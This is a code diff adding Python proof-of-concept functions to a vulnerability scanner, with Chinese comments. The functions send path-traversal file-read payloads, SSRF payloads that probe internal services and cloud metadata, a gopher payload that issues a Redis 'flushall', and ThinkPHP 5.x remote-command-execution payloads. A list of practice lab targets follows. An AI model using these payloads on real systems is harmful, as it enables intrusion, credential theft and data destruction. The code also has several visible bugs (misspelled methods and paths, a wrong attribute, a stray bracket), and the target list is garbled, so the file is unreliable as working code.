@@ -1,0 +1,125 @@
+#任意读取文件lfi
+import requests
+def poc_lfi(self,url):
+    payload = [
+        "../../../../../../etc/password",
+        "../../../../../../windows/win.ini",
+        "..\\..\\..\\..\\..\\..\\windows\\win.ini",
+        "php://filter/convert.base64-encode/resource=index.php"
+    ]
+    for payload in payload:
+        try:
+            test_url = url.replace("file=","").replace("page=","").split("?")[0]
+            if"?"in url:
+                test_url = url.split("?")[0]+f"?file={payload}"
+            else:
+                test_url = url + payload if not url.endsith("/")else url["-1"]+payload
+            resp = requests.get(test_url,timeout=6,verify=False,allow_redirects=False)
+            text = resp.text.lower()
+            if"root:"in text and "bash" in text or "extensions" in text and "mci" in text or "pd89" in text: #linux passwd /win.ini/base64
+                return f"[任意文件读取]{test_url[:60]}..->读取到系统文件"
+        except:
+            continue
+    return None
+
+#SSRF基础版
+def poc_ssrf(self,url):
+    payloads =  [
+        "http://127.0.0.1:22",
+        "http://127.0.0.1:3306",
+        "http://127.0.0.1:6379",
+        "http://169.254.169.254/latest/meta-data/",
+        "file:///etc/passwd",
+        "gopher://127.0.0.1:6378/_*1%0d%0a$8%0d%0aflushall%0d%0a"
+    ]
+    for payload in payloads:
+        try:
+            test_url = url.replace("url=","").replace("u=","").split("?")[0]
+            test_url = test_url + f"?url={payload}" if "?" in url else test_url + payload
+
+            resp = requests.get(test_url,timeout=7,verify=False)
+            text = resp.text.lower()
+            if any(kw in text for kw in ["ssh","mysql","redis","ami-id","root:","uid="]):
+                return f"[SSRF]{test_url[:60]}..->访问到内网服务"
+        except:
+            continue
+    return None
+
+#ThinkPHP 5.x RCE
+def poc_thinkphp_rce(self,url):
+    payloads = [
+        "?s=captcha&_method=__construct&method=GET&filter[]=system&server[REQUEST_METHOD]=whoami",
+        "?s=captcha&_method=__construct&method=GET&filter[]=system&get[]=id",
+        "?s=home/index/construct&name=1&_method=_construct&method=POST&filter[]=system&server[REQUEST_METHOD]=whoami]"
+    ]
+    for payload in payloads:
+        try:
+            test_url = url.rstrip("/")+"/"+payload.lstrip("?")
+            resp = requests.get(test_url,timeout=6,verify=False)
+            if resp.status_code == 200 and len(resp.text) < 100 and ("root" in resp.text or "adminstrator" in resp.text or "www-data" in resp.txt):
+                cmd_result = resp.text.strip().replace("\n","")
+                return f"[ThinkPHP RCE]{test_url[:60]}..->{cmd_result}"
+        except:
+            continue
+    return None
+
+"""
+1. 打开 `sharpscan.py`
+2. 在 `scan_worker()`调用：
+   ```python
+                lfi_res = self.poc_lfi(target)
+                ssrf_res = self.poc_ssrf(target)
+                tp_res = self.poc_thinkphp_rce(target)
+                for res in [lfi_res, ssrf_res, tp_res]:
+                    if res:
+                        self.vuln_results.append(res)
+                        print(f"发现漏洞：{res}")
+   ```
+"""
+# ```
+# http: // testphp.vulnweb.com / artists.php?artist =
+# http: // testphp.vulnweb.com / search.php?search =
+# http: // testphp.vulnweb.com / listproducts.php?cat =
+# http: // pikachu.shuimugan.com / vul / lfi / lfi.php?file =
+# http: // pikachu.shuimugan.com / vul / ssrf / ssrf.php?url =
+# http: // tp5.shuimugan.com / index.php?s = captcha
+# http: // dvwa.shuimugan.com / vulnerabilities / fi /?page =
+# http: // dvwa.shuimugan.com / vulnerabilities / exec /
+# http: // thinkphp.shuimugan.com / public / index.php?s = captcha
+# https: // www - 3
+# dvuln - com
+# .3
+# dgame.lab / artists.php?artist = 1
+# ```
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
